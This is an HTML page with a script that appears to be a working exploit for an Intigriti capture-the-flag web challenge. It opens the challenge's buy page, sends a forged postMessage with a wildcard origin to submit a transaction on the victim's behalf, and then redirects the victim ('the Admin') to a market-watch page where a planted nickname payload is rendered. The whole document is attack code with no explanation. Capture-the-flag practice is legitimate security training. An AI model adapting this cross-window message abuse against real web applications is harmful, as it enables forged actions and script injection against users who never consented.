<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. Open the Buy page as the Admin
        const challengeWin = window.open("https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1");

        setTimeout(() => {
            // 2. Trigger the transaction via the postMessage bug
            // This puts your "nickname" (the payload) into the Market Watch list
            challengeWin.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: '0x1337',
                    currency: 'BTC',
                    amount: 0.000001
                }
            }, '*');

            // 3. Redirect the Admin to the page that renders the nickname
            setTimeout(() => {
                challengeWin.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
            }, 2000);
        }, 4000);
    </script>
</body>
</html>
